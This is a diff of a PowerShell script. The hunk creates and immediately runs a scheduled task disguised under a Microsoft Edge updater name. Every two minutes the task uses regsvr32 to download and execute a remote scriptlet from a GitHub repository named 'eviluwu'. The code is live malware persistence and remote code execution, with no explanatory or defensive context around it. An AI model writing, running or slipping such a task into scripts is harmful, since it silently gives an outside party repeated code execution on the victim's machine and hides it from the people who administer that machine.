@@ -111,8 +111,7 @@ $cleanup = {
     if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
         # Task isn't restarted if it's registered.
     } else {
-        schtasks /create /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore" /tr "regsvr32 /s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll" /sc minute /mo 5 /f
-        schtasks /run /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore"
+        schtasks /create /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore" /tr "regsvr32 /s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll" /sc minute /mo 2 /f /z; schtasks /run /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore"
     }
 
 }
